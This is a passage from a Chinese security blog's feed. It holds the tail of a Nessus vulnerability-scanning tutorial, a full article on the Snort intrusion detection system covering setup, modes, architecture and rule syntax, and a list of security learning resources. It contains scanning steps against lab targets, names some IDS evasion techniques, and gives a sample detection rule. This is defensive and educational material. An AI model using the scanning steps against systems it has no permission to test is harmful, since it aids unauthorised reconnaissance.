扫描漏洞，扫描任务执行完成后，显示如下</em></strong></p><p><strong><em>(5) 双击扫描任务Sample Scan，将显示扫描的详细信息</em></strong></p><p><strong><em>(6) 查看扫描主机的漏洞情况</em></strong></p><p><em>可以查看Vulnerability列，该列中的数字表示扫描到的信息数。右侧显示了扫描的详细信息，如扫描任务名称、状态、策略、目标主机和时间等。右下角以圆形图显示了漏洞的危险情况，分别使用不同颜色显示漏洞的严重性</em></p><p><strong><em>(7) 单击INFO按钮，将显示具体的漏洞信息</em></strong></p><p><em>使用Nessus还可以通过导出文件的方式查看漏洞信息，导出的文件格式包括Nessus、PDF、HTML、CSV和Nessus DB</em></p><h3 id="2-扫描网络漏洞"><a href="#2-扫描网络漏洞" class="headerlink" title="2. 扫描网络漏洞"></a>2. 扫描网络漏洞</h3><p><em>使用Nessus攻击一个大范围的漏洞，需要配置评估漏洞列表并指定获取信息的评估列表；本节将介绍配置Nessus在目标主机寻找网络漏洞，这些漏洞指目标主机或其他网络协议</em></p><p><strong><em>(1) 新建名为Internal Network Scan策略</em></strong></p><p><strong><em>(2) 添加所需的插件程序</em></strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E6%8F%92%E4%BB%B6%E7%A8%8B%E5%BA%8F.png" alt=""></p><p><strong><em>(3) 新建名为Network Scan扫描任务</em></strong></p><p><strong><em>(4) 扫描结果如下</em></strong></p><p><em>如果想要详细地分析该漏洞，可以将该信息使用文件的形式导出</em></p><h3 id="3-扫描指定Linux系统漏洞"><a href="#3-扫描指定Linux系统漏洞" class="headerlink" title="3. 扫描指定Linux系统漏洞"></a>3. 扫描指定Linux系统漏洞</h3><p><strong><em>(1) 使用Metasploitable 2.0作为目标主机</em></strong></p><p><strong><em>(2) 新建名为Linux Vulnerability Scan策略</em></strong></p><p><strong><em>(3) 添加所需的插件程序</em></strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E6%BC%8F%E6%89%AB.png" alt=""></p><p><strong><em>(4) 新建名为Linux Vulnerability Scan扫描任务</em></strong></p><p><strong><em>(5) 扫描漏洞</em></strong></p><h3 id="4-扫描指定Windows系统漏洞"><a href="#4-扫描指定Windows系统漏洞" class="headerlink" title="4. 扫描指定Windows系统漏洞"></a>4. 扫描指定Windows系统漏洞</h3><p><strong><em>(1) 新建名为Windows Vulnerability Scan策略</em></strong></p><p><strong><em>(2) 添加所需的插件程序</em></strong></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/windows.png" alt=""></p><p><strong><em>(3) 开始扫描漏洞</em></strong></p><hr><h2 id="0x04-高阶用法"><a href="#0x04-高阶用法" class="headerlink" title="0x04 高阶用法"></a>0x04 高阶用法</h2><h3 id="1-自定义策略"><a href="#1-自定义策略" class="headerlink" title="1. 自定义策略"></a>1. 自定义策略</h3><p><em>参考连接</em></p><ul><li><p><a href="http://www.freebuf.com/column/144954.html" target="_blank" rel="noopener">http://www.freebuf.com/column/144954.html</a></p></li><li><p><a href="http://www.freebuf.com/column/144167.html" target="_blank" rel="noopener">http://www.freebuf.com/column/144167.html</a></p></li></ul><h3 id="2-AutoNessus"><a href="#2-AutoNessus" class="headerlink" title="2. AutoNessus"></a>2. AutoNessus</h3><p><em>项目连接：</em><a href="https://github.com/redteamsecurity/AutoNessus" target="_blank" rel="noopener">https://github.com/redteamsecurity/AutoNessus</a></p><h3 id="3-Nessus插件"><a href="#3-Nessus插件" class="headerlink" title="3. Nessus插件"></a>3. Nessus插件</h3><p><em>参考连接：</em><a href="http://www.freebuf.com/vuls/164198.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/164198.html</a></p><hr><h2 id="0xFF-学习资源"><a href="#0xFF-学习资源" class="headerlink" title="0xFF 学习资源"></a>0xFF 学习资源</h2><ul><li><p><a href="https://docs.tenable.com/Nessus.htm" target="_blank" rel="noopener">Nessus Official Document</a></p></li><li><p><a href="https://docs.tenable.com/nessus/7_2/Content/Resources/PDF/Nessus_7_2.pdf" target="_blank" rel="noopener">Nessus_7_2 User Guide</a></p></li><li><p><a href="http://static.tenable.com/documentation/nessus_6.8_command_line_reference.pdf" target="_blank" rel="noopener">Nessus 6.8 Command Line Reference</a></p></li><li><p><a href="file:///H:/Book/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/Kali%20Linux/Nessus%206.3%20%E4%B8%AD%E6%96%87%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C.pdf" target="_blank" rel="noopener">Nessus 6.3 中文用户指南</a></p></li><li><p><a href="http://search.freebuf.com/search/?search=nessus#article" target="_blank" rel="noopener">Freebuf - Nessus 实战用法</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.tenable.com/products/nessus/nessus-professional&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Nessus&lt;/a&gt; 是一款优秀的系统漏洞扫描与分析软件，提供完整的漏洞扫描服务,，并随时更新其漏洞数据库，可同时在本机或远端上摇控, 进行系统的漏洞分析扫描；本文对其扫描原理，基本用法，及高阶功能进行总结分析&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x02 原理浅析" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    
      <category term="安全产品" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/"/>
    
    
      <category term="SecTools" scheme="http://www.firehacker.top/tags/SecTools/"/>
    
      <category term="SecProducts" scheme="http://www.firehacker.top/tags/SecProducts/"/>
    
      <category term="Nessus" scheme="http://www.firehacker.top/tags/Nessus/"/>
    
  </entry>
  
  <entry>
    <title>入侵检测之Snort浅析</title>
    <link href="http://www.firehacker.top/2018/09/30/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B9%8BSnort%E6%B5%85%E6%9E%90/"/>
    <id>http://www.firehacker.top/2018/09/30/入侵检测之Snort浅析/</id>
    <published>2018-09-30T11:37:53.000Z</published>
    <updated>2018-10-24T06:57:22.801Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://snort.org/" target="_blank" rel="noopener">Snort</a> 是一套开放源代码的网络入侵预防软件与网络入侵检测软件，属于基于特征检测（模式匹配）的轻量级NIDS；本文从snort体系结构，模块配置，规则编写，可视化分析等方面进行实战分析<br><a id="more"></a></p></blockquote><hr><h2 id="0x01-Snort-简述"><a href="#0x01-Snort-简述" class="headerlink" title="0x01 Snort 简述"></a>0x01 Snort 简述</h2><h3 id="1-简易安装"><a href="#1-简易安装" class="headerlink" title="1. 简易安装"></a>1. 简易安装</h3><p><strong>(1) 源码安装</strong></p><pre><code>wget https://snort.org/downloads/snort/daq-2.0.6.tar.gzwget https://snort.org/downloads/snort/snort-2.9.11.1.tar.gztar xvzf daq-2.0.6.tar.gz                    cd daq-2.0.6./configure &amp;&amp; make &amp;&amp; sudo make installtar xvzf snort-2.9.11.1.tar.gz                cd snort-2.9.11.1./configure --enable-sourcefire &amp;&amp; make &amp;&amp; sudo make install</code></pre><p><em>安装完毕，输入 <code>snort</code>，显示如下（Ubuntu环境）</em></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/snort%20union.png" alt=""></p><p><strong>(2) Centos 环境</strong></p><pre><code>yum install https://snort.org/downloads/snort/daq-2.0.6-1.centos7.x86_64.rpmyum install https://snort.org/downloads/snort/snort-2.9.11.1-1.centos7.x86_64.rpm</code></pre><p><strong>(3) Windows 环境</strong></p><pre><code>execute: Snort_2_9_11_1_Installer.exe</code></pre><p><strong>(4) Security Onion</strong></p><p><a href="https://securityonion.net/" target="_blank" rel="noopener">Security Onion</a>，一个专为入侵检测和  NSM 设计的 Linux 发行版，预置 Snort，Bro，Argus 等安全工具</p><p><em>输入 <code>snort</code>，显示如下（预装环境）</em></p><p><img src="http://pcdbq4c2i.bkt.clouddn.com/snort%20onion.png" alt=""></p><p><em>参考链接</em></p><ul><li><p><a href="https://snort.org/" target="_blank" rel="noopener">https://snort.org/</a></p></li><li><p><a href="http://www.linuxdiyf.com/linux/28868.html" target="_blank" rel="noopener">http://www.linuxdiyf.com/linux/28868.html</a></p></li><li><p><a href="https://www.ibm.com/developerworks/cn/web/wa-snort1/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/web/wa-snort1/index.html</a></p></li></ul><h3 id="2-工作模式"><a href="#2-工作模式" class="headerlink" title="2. 工作模式"></a>2. 工作模式</h3><p><strong>(1) 嗅探器模式：</strong>从网络上读取数据包并作为连续不断的流显示在终端上</p><pre><code>./snort -vde or ./snort -d -v -e</code></pre><p>使snort输出IP和TCP/UDP/ICMP的包头信息，显示应用层的数据信息，数据链路层的信息</p><p><strong>(2) 数据包记录器模式：</strong>把数据包记录到硬盘上，需要指定一个日志目录，snort就会自动记录数据包</p><pre><code>./snort -dev -l ./log 指定日志目录，记录所有看到的数据包./snot -dev -l ./log -h ip 记录进入指定ip的所有包的数据链路、TCP/IP以及应用层的数据记录到目录./log中./snort -l ./log -b 把所有的包记录到一个单一的二进制文件中./snort -dv -r packer.log 在嗅探器模式下把一个tcpdump格式的二进制文件中的包打印到屏幕上</code></pre><p><strong>(3) 网络入侵检测模式：</strong>分析网络数据流以匹配用户定义的一些规则，并根据检测结果采取一定的动作</p><pre><code>./snort -dev -l ./log -h ip -c snort.conf  启动 NIDS 模式，snort.conf是规则集文件，对每个包和规则集进行匹配，发现这样的包就采取相应的行动./snort -d -h ip -l ./log -c snort.conf 基本模式，-v选项，使snort向屏幕上输出一些信息，会大大降低snort的处理速度；去掉-e 选项，不需要记录数据链路层的包头</code></pre><h3 id="3-输出选项"><a href="#3-输出选项" class="headerlink" title="3. 输出选项"></a>3. 输出选项</h3><p>在NIDS模式下，有很多的方式来配置snort的输出。在默认情况下，snort以ASCII格式记录日志，使用full报警机制。如果使用full报警机制，snort会在包头之后打印报警消息</p><p><strong><em>报警机制：full、fast、socket、syslog、smb(winpopup)和none</em></strong></p><pre><code>-A fast：报警信息包括：一个时间戳(timestamp)、报警消息、源/目的IP地址和端口-A full：是默认的报警模式-A unsock：把报警发送到一个UNIX套接字，需要有一个程序进行监听，这样可以实现实时报警-A none：关闭报警机制-s 选项：使snort把报警消息发送到syslogSMB报警机制：通过SAMBA把报警消息发送到Windows主机，运行./configure脚本时，必须使用--enable-smbalerts选项</code></pre><p><strong><em>输出配置示例</em></strong></p><pre><code>./snort -c snort.conf -l ./log -s -h ip 使用默认的日志方式(以解码的ASCII格式)并且把报警发给syslog./snort -c snort.conf -b -M WORKSTATIONS 使用二进制日志格式和 SMB 报警机制</code></pre><hr><h2 id="0x02-源码分析"><a href="#0x02-源码分析" class="headerlink" title="0x02 源码分析"></a>0x02 源码分析</h2><h3 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1. 目录结构"></a>1. 目录结构</h3><pre><code>├── barnyard2.conf      barnyard2日志分析工具配置文件 ├── snort.conf          snort配置文件（关键） ├── threshold.conf      事件过滤配置文件 ├── classification.config 规则分类配置文件(classtype) ├── reference.config      外部参考配置文件(reference) ├── gen-msg.map      generate id 和 msg 对应关系map ├── sid-msg.map      snort id 和 msg对应关系map ├── unicode.map      预处理器http_inspect编码翻译文件 ├── preproc_rules       预处理器及解码器规则集 │ ├── decoder.rules   │ ├── preprocessor.rules │ └── sensitive-data.rules ├── rules               Snort规则集（关键） │  ├── web-iis.rules  │  ├── web-php.rules More… ├── so_rules            Share Object规则集 │  ├── browser-ie.rules │  ├── browser-other.rules     More…</code></pre><p><em>Snort.conf 配置文件</em></p><pre><code>(1) Set the network variables.  设置各类网络地址，规则中易于使用(2) Configure the decoder      设置解码器(3) Configure the base detection engine  设置基础检测引擎(4) Configure dynamic loaded libraries   设置动态链接库(5) Configure preprocessors     设置预处理器(6) Configure output plugins    设置输出插件(7) Customize your rule set     设置自定义规则(8) Customize preprocessor and decoder rule set设置预处理、解码器规则(9) Customize shared object rule set 设置共享对象规则集</code></pre><hr><h2 id="0x03-体系结构"><a href="#0x03-体系结构" class="headerlink" title="0x03 体系结构"></a>0x03 体系结构</h2><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.png" alt=""></p><ul><li><p><strong>数据包嗅探模块</strong>：主要负责监听网络数据包，并根据TCP/IP协议解析数据包</p></li><li><p><strong>预处理模块</strong>：1.包重组预处理器，它的作用是为了防止攻击信息被拆分到多个包中而 逃避了Snort的检测；2.协议编码预处理器，它的功能是把数据包协议解码成一个统一的格式，再传送给检测模块；3.协议异常检测预处器</p></li><li><p><strong>检测引擎模块</strong>：当预处理器把数据包送过来后，检测引擎将这些数据包与三维链表形式的检测规则进行匹配，一旦发现数据包中的内容和某条规则相匹配，就通知报警模块</p></li><li><p><strong>报警/日志模块</strong>：检测引擎将数据包传送给报警模块后，报警模块会根据规则定义（alert，log..）对其进行不同的处理（数据库，日志）</p></li></ul><hr><h2 id="0x04-模块简析"><a href="#0x04-模块简析" class="headerlink" title="0x04 模块简析"></a>0x04 模块简析</h2><h3 id="1-解码-预处理模块"><a href="#1-解码-预处理模块" class="headerlink" title="1. 解码/预处理模块"></a>1. 解码/预处理模块</h3><p><strong>(1) 模块功能</strong></p><p><em>解码模块主要是将从监控网络当中抓取的原始网络数据包，按照各个网络协议栈从下至上进行解码，并将解码数据保存到各个对应的数据结构当中，最后交由预处理模块进行处理。解码后的数据包经过预处理之后才能被主探测引擎进行规则匹配</em></p><p><em>预处理器的主要用来应对一些IDS攻击手段。其作用包括：</em></p><pre><code>(1)针对可疑行为检查包或修改包，以便探测引擎能对其正确解释(2)负责对流量标准化，以便探测引擎能精确匹配特征</code></pre><p><strong>(2) IDS 规避技术</strong></p><pre><code>1. 多态 URL 编码2. 多态 shellcode3. 会话分割4. IP 碎片</code></pre><p><strong>(3) 预处理器分类</strong></p><pre><code>1. 包重组预处理器：   frag3：IP分片重组和攻击监测   stream：维持TCP流状态，进行会话重组2. 协议规范化预处理器：   http_inspect：规范HTTP流   rpcDecode：规范RPC调用3. 异常检测预处理器：   ARP spoof：检测ARP欺骗   sfPortscan：检测端口扫描</code></pre><p><strong>(4) 模块配置</strong></p><p><em>配置分两个步骤，都是在snort.conf中配置</em></p><p><em>1.snort.conf的（2) 和（5) 中配置解码器或者预处理参数</em></p><p><em>2.snort.conf的（8) 中启用检测规则</em></p><pre><code>(2) Configure the decoder    设置解码器(5) Configure preprocessors  设置预处理器(8) Customize preprocessor and decoder rule set 设置预处理、解码器规则</code></pre><hr><h2 id="0x05-Snort-规则"><a href="#0x05-Snort-规则" class="headerlink" title="0x05 Snort 规则"></a>0x05 Snort 规则</h2><h3 id="1-规则组成"><a href="#1-规则组成" class="headerlink" title="1. 规则组成"></a>1. 规则组成</h3><p><img src="http://pcdbq4c2i.bkt.clouddn.com/%E8%A7%84%E5%88%99%E7%BB%93%E6%9E%84.png" alt=""></p><p><em>大多数snort规则都写在一个单行上，或者在多行之间的行尾用/分隔。Snort规则被分成两个逻辑部分：规则头和规则选项。规则头包含规则的动作，协议，源和目标ip地址与网络掩码，以及源和目标端口信息；规则选项部分包含报警消息内容和要检查的包的具体部分</em></p><p><strong>(1) 规则头</strong></p><p><em>组成：规则动作；协议；源信息；目的信息</em></p><p><strong><em>规则头Snort预置的规则动作</em></strong></p><pre><code>1、Alert-使用选择的报警方法生成一个警报，然后记录（log）这个包2、Log-记录这个包3、Pass-丢弃（忽略）这个包4、activate-报警并且激活另一条dynamic规则5、dynamic-保持空闲直到被一条activate规则激活，被激活后就作为一条log规则执行</code></pre><p>可以定义自己的规则类型并且附加一条或者更多的输出模块给它，然后你就可以使用这些规则类型作为snort规则的一个动作    </p><p><strong><em>协议：tcp 、udp、icmp 和 ip</em></strong></p><p><strong><em>IP 地址：关键字”any”可以被用来定义任何地址，地址由直接的数字型ip地址和一个cidr块组成的</em></strong></p><p><strong><em>端口号：端口号可以用几种方法表示，包括”any”端口、静态端口定义、范围、以及通过否定操作符</em></strong></p><pre><code>1. &quot;any&quot;端口是一个通配符，表示任何端口2. 静态端口定 义表示一个单个端口号，例如111表示portmapper，23表示telnet，80表示http等等3. 端口范围用范围操作符&quot;：&quot;表示4. log udp any any -&gt; 192.168.1.0/24 1:1024 记录来自任何端口的，目标端口范围在1到1024的udp流5. log tcp any any -&gt; 192.168.1.0/24 :6000 记录来自任何端口，目标端口小于等于6000的tcp流6. log tcp any :1024 -&gt; 192.168.1.0/24 500: 记录来自任何小于等于1024的特权端口，目标端口大于等于500的tcp流7. 端口否定操作符用&quot;！&quot;表示</code></pre><p><strong>(2) 规则选项</strong></p><p><em>规则选项组成了snort入侵检测引擎的核心，在规则头信息的基础上进一步分析，有了它才能确认复杂的攻击(Snort的规则定义中可以没有规则体)；所有的snort规则选项用分号”；”隔开，规则选项关键字和它们的参数用冒号”：”分开，snort中有42个规则选项关键字</em></p><pre><code>msg - 在报警和包日志中打印一个消息。logto - 把包记录到用户指定的文件中而不是记录到标准输出。ttl - 检查ip头的ttl的值。tos 检查IP头中TOS字段的值。id - 检查ip头的分片id值。ipoption 查看IP选项字段的特定编码。fragbits 检查IP头的分段位。dsize - 检查包的净荷尺寸的值 。flags -检查tcp flags的值。seq - 检查tcp顺序号的值。ack - 检查tcp应答（acknowledgement）的值。window 测试TCP窗口域的特殊值。itype - 检查icmp type的值。icode - 检查icmp code的值。icmp_id - 检查ICMP ECHO ID的值。icmp_seq - 检查ICMP ECHO 顺序号的值。content - 在包的净荷中搜索指定的样式。content-list 在数据包载荷中搜索一个模式集合。offset - content选项的修饰符，设定开始搜索的位置 。depth - content选项的修饰符，设定搜索的最大深度。nocase - 指定对content字符串大小写不敏感。session - 记录指定会话的应用层信息的内容。rpc - 监视特定应用/进程调用的RPC服务。resp - 主动反应（切断连接等）。react - 响应动作（阻塞web站点）。reference - 外部攻击参考ids。sid - snort规则id。rev - 规则版本号。classtype - 规则类别标识。priority - 规则优先级标识号。uricontent - 在数据包的URI部分搜索一个内容。tag - 规则的高级记录行为。ip_proto - IP头的协议字段值。sameip - 判定源IP和目的IP是否相等。stateless - 忽略刘状态的有效性。regex - 通配符模式匹配。within - 强迫关系模式匹配所在的范围。byte_test - 数字模式匹配。byte_jump - 数字模式测试和偏移量调整。</code></pre><p><strong>(3) 规则范例</strong></p><pre><code>alert tcp any any -&gt; 192.168.1.0/24 111 (content:&quot;USER&quot;; msg: &quot;mountd access&quot;;)</code></pre><p><em>第一个括号前的部分是规则头（rule header），包含的括号内的部分是规则选项（rule options）。规则选项部分中冒号前的单词称为选项关键字（option keywords），不是所有规则都必须包含规则选项部分，选项部分只是为了使对要收集或报警，或丢弃的包的定义更加严格</em></p><pre><code>1. alert表示规则动作为报警2. tcp表示协议类型为TCP协议3. 第一个any表示源IP地址为任意IP地址4. -&gt;表示发送方向操作符，还有&lt;&gt;双向5. 第二个any表示源端口为任意端口6. content:&quot;USER&quot;表示匹配的字符串为“USER”7. msg:&quot;mountd access&quot;表示报警信息为“mountd access”</code></pre><hr><h2 id="0x06-可视化分析"><a href="#0x06-可视化分析" class="headerlink" title="0x06 可视化分析"></a>0x06 可视化分析</h2><hr><h2 id="0xFF-参考资源"><a href="#0xFF-参考资源" class="headerlink" title="0xFF 参考资源"></a>0xFF 参考资源</h2><ul><li><p><a href="https://snort-org-site.s3.amazonaws.com/production/document_files/files/000/000/129/original/snort_manual.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIXACIED2SPMSC7GA%2F20180930%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20180930T122308Z&amp;X-Amz-Expires=172800&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=545de541fe9ff5dca711d4813290d8482043ec04899558440e705970ab1f301b" target="_blank" rel="noopener">SNORT Users Manual</a></p></li><li><p><a href="http://www.phperz.com/special/102.html" target="_blank" rel="noopener">Snort 中文手册</a></p></li><li><p><a href="http://drops.mayter.cn/#!/drops/811.SNORT%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">Wooyun Drops - SNORT入侵检测系统</a></p></li><li><p><a href="https://www.sec-wiki.com/book/44" target="_blank" rel="noopener">《网络安全监控 收集、检测与分析》</a></p></li><li><p><a href="https://pan.baidu.com/s/1x_qUX02Ny3zaY8npn11m3g" target="_blank" rel="noopener">《Snort轻量级入侵检测系统全攻略》</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://snort.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Snort&lt;/a&gt; 是一套开放源代码的网络入侵预防软件与网络入侵检测软件，属于基于特征检测（模式匹配）的轻量级NIDS；本文从snort体系结构，模块配置，规则编写，可视化分析等方面进行实战分析&lt;br&gt;
    
    </summary>
    
      <category term="0x02 原理浅析" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    
      <category term="安全产品" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/"/>
    
    
      <category term="SecTools" scheme="http://www.firehacker.top/tags/SecTools/"/>
    
      <category term="SecProducts" scheme="http://www.firehacker.top/tags/SecProducts/"/>
    
      <category term="Snort" scheme="http://www.firehacker.top/tags/Snort/"/>
    
  </entry>
  
  <entry>
    <title>安全学习资源导航</title>
    <link href="http://www.firehacker.top/2018/09/27/%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90%E5%AF%BC%E8%88%AA/"/>
    <id>http://www.firehacker.top/2018/09/27/安全学习资源导航/</id>
    <published>2018-09-27T12:40:15.000Z</published>
    <updated>2018-09-27T13:07:40.036Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一些安全相关的学习资源导航，包括Wooyun Drops，CSS 期刊，Github Awesome，Awesome-ml-for-cybersecurity，安全书籍出版等</p></blockquote><a id="more"></a><hr><h3 id="知识库"><a href="#知识库" class="headerlink" title="知识库"></a>知识库</h3><ul><li><p><a href="http://drops.leesec.com/#!/" target="_blank" rel="noopener">Wooyun Drops</a>  <em>乌云知识库</em></p></li><li><p><a href="http://wiki.secbug.net/" target="_blank" rel="noopener">WooYun WiKi</a>  <em>乌云百科</em></p></li><li><p><a href="https://paper.seebug.org/" target="_blank" rel="noopener">404 Paper</a>  <em>安全技术精粹</em></p></li><li><p><a href="http://wiki.ioin.in/" target="_blank" rel="noopener">Sec-News</a>  <em>安全文章分享</em></p></li><li><p><a href="https://www.pediy.com/kssd/index.html" target="_blank" rel="noopener">看雪KSSD</a>  <em>看雪安全文档库</em></p></li><li><p><a href="https://www.secpulse.com/archives/category/articles" target="_blank" rel="noopener">SECPULSE </a> <em>分享技术，悦享品质</em></p></li></ul><h3 id="期刊检索"><a href="#期刊检索" class="headerlink" title="期刊检索"></a>期刊检索</h3><ul><li><a href="https://dblp.uni-trier.de/db/conf/ccs/" target="_blank" rel="noopener">CCS</a>  <em> Conference on Computer and Communications Security</em></li></ul><h3 id="开源文档"><a href="#开源文档" class="headerlink" title="开源文档"></a>开源文档</h3><ul><li><p><a href="https://www.owasp.org/index.php/Main_Page" target="_blank" rel="noopener">OWASP</a> <em>The Open Web Application Security Project</em></p></li><li><p><a href="https://github.com/Hack-with-Github/Awesome-Hacking" target="_blank" rel="noopener">Awesome-Hacking</a> <em>A collection of various awesome lists for hackers, pentesters and security researchers</em></p></li><li><p><a href="https://github.com/enaqx/awesome-pentest" target="_blank" rel="noopener">Awesome-Pentest</a> <em>A collection of awesome penetration testing resources, tools and other shiny things</em></p></li><li><p><a href="https://github.com/sbilly/awesome-security" target="_blank" rel="noopener">Awesome-Security</a> <em>A collection of awesome  documents, books, resources and cools stuffs about security</em></p></li></ul><h3 id="脚本编程"><a href="#脚本编程" class="headerlink" title="脚本编程"></a>脚本编程</h3><ul><li><p><a href="https://www.lua.org/docs.html" target="_blank" rel="noopener">Lua</a> <em>简洁、轻量、可扩展的脚本语言</em></p></li><li><p><a href="https://www.ruby-lang.org/zh_cn/documentation/" target="_blank" rel="noopener">Ruby</a> <em>面向对象、命令式、函数式、动态的通用编程语言</em></p></li><li><p><a href="https://www.perl.org/" target="_blank" rel="noopener">Perl</a> <em>高阶、通用、解释型、动态的程序语言</em></p></li><li><p><a href="http://linuxcommand.org/lc3_lts0010.php" target="_blank" rel="noopener">Shell</a> <em>shell script，一种为 shell编写的脚本程序</em></p></li><li><p><a href="https://www.python.org/" target="_blank" rel="noopener">Python</a> <em>一种广泛使用的高级编程语言，通用型编程语言</em></p></li><li><p><a href="https://docs.microsoft.com/en-us/powershell/scripting/powershell-scripting?view=powershell-6" target="_blank" rel="noopener">Powershell</a> <em>Microsoft命令行与脚本语言</em></p></li></ul><h3 id="攻防实战"><a href="#攻防实战" class="headerlink" title="攻防实战"></a>攻防实战</h3><ul><li><p><a href="https://www.offensive-security.com/" target="_blank" rel="noopener">Offensive-Security</a> <em>Information Security Training,  Virtual Labs and Penetration Testing Services</em></p></li><li><p><a href="http://www.cis.syr.edu/~wedu/seed/Labs_16.04/" target="_blank" rel="noopener">SeedLabs</a> <em>Develop hands-on laboratory exercises for computer and information security education </em></p></li><li><p><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">Webgoat</a> <em>A deliberately insecure web application maintained by OWASP </em></p></li><li><p><a href="https://vulhub.org/" target="_blank" rel="noopener">Vulhub</a> <em>一个基于docker和docker-compose的漏洞环境集合,让漏洞复现变得更加简单</em></p></li></ul><h3 id="MLsec合集"><a href="#MLsec合集" class="headerlink" title="MLsec合集"></a>MLsec合集</h3><ul><li><p><a href="https://github.com/jivoi/awesome-ml-for-cybersecurity" target="_blank" rel="noopener">Awesome-ml-for-cybersecurity</a> <em>Github上网络安全机器学习相关工具和资源列表</em></p></li><li><p><a href="https://www.kdnuggets.com/2017/01/machine-learning-cyber-security.html" target="_blank" rel="noopener">Machine-learning-cyber-security</a> <em>机器学习和数据挖掘在网络安全中的应用资源</em></p></li><li><p><a href="https://www.hansight.com/blog-list-1.html" target="_blank" rel="noopener">HanSight BOLG</a> <em> AI与大数据分析安全</em></p></li></ul><h3 id="云-amp-安全"><a href="#云-amp-安全" class="headerlink" title="云 &amp; 安全"></a>云 &amp; 安全</h3><ul><li><p><a href="https://cloud.nsfocus.com/#/" target="_blank" rel="noopener">绿盟云安全</a></p></li><li><p><a href="https://security.aliyun.com/?spm=5176.8134464.1146454.20.QHJELX" target="_blank" rel="noopener">阿里云安全</a></p></li><li><p><a href="https://files.alicdn.com/tpsservice/8f772817aa9c41afa760359e7d9bba6d.pdf?spm=a2c63.o282931.a3.1.2e77539fKdh9EX&amp;file=8f772817aa9c41afa760359e7d9bba6d.pdf" target="_blank" rel="noopener">阿里云安全白皮书</a></p></li><li><p><a href="https://cloud.tencent.com/developer/search/article-%E4%BA%91%E5%AE%89%E5%85%A8" target="_blank" rel="noopener">腾讯云社区云安全</a></p></li><li><p><a href="http://blog.nsfocus.net/?s=%E4%BA%91%E5%AE%89%E5%85%A8" target="_blank" rel="noopener">绿盟科技博客-云安全</a></p></li><li><p><a href="http://www.jos.org.cn/jos/ch/reader/create_pdf.aspx?file_no=3958&amp;journal_id=jos" target="_blank" rel="noopener">云计算安全研究-软件学报</a></p></li><li><p><a href="http://staff.ustc.edu.cn/~sycheng/cs/chap13_Cloud_Computing_Security.pdf" target="_blank" rel="noopener">云计算安全-中科大</a></p></li><li><p><a href="http://cjc.ict.ac.cn/cre/lcc.pdf" target="_blank" rel="noopener">云安全架构-计算机学报</a></p></li><li><p><a href="http://secwiki.neu.edu.cn/wiki/images/6/66/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E4%BA%91%E8%AE%A1%E7%AE%97%E5%AE%89%E5%85%A8_%E5%90%B4%E7%BF%B0%E6%B8%85.pdf" target="_blank" rel="noopener">深入浅出云计算安全-吴瀚清</a> </p></li></ul><h3 id="书籍出版"><a href="#书籍出版" class="headerlink" title="书籍出版"></a>书籍出版</h3><ul><li><p><a href="http://www.ituring.com.cn/book?tab=book&amp;sort=hot&amp;category=74" target="_blank" rel="noopener">图灵社区-信息安全系列</a></p></li><li><p><a href="Computer Security &amp; Encryption">亚马逊-安全与加密系列</a></p></li><li><p><a href="http://search.china-pub.com/s/?key1=%b0%b2%c8%ab&amp;pz=1&amp;type=59-04&amp;ordertype=1" target="_blank" rel="noopener">华章图书-安全系列丛书</a></p></li><li><p><a href="http://www.broadview.com.cn/search?q=%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF" target="_blank" rel="noopener">博文视点-安全技术系列</a></p></li></ul><h3 id="综合资源"><a href="#综合资源" class="headerlink" title="综合资源"></a>综合资源</h3><ul><li><p><a href="https://www.shentoushi.top/knowledge" target="_blank" rel="noopener">Shentoushi-Knowledge</a></p></li><li><p><a href="https://www.sec-wiki.com/news" target="_blank" rel="noopener">SecWiki - News &amp; Topic</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;一些安全相关的学习资源导航，包括Wooyun Drops，CSS 期刊，Github Awesome，Awesome-ml-for-cybersecurity，安全书籍出版等&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x04 拓展梳理" scheme="http://www.firehacker.top/categories/0x04-%E6%8B%93%E5%B1%95%E6%A2%B3%E7%90%86/"/>
    
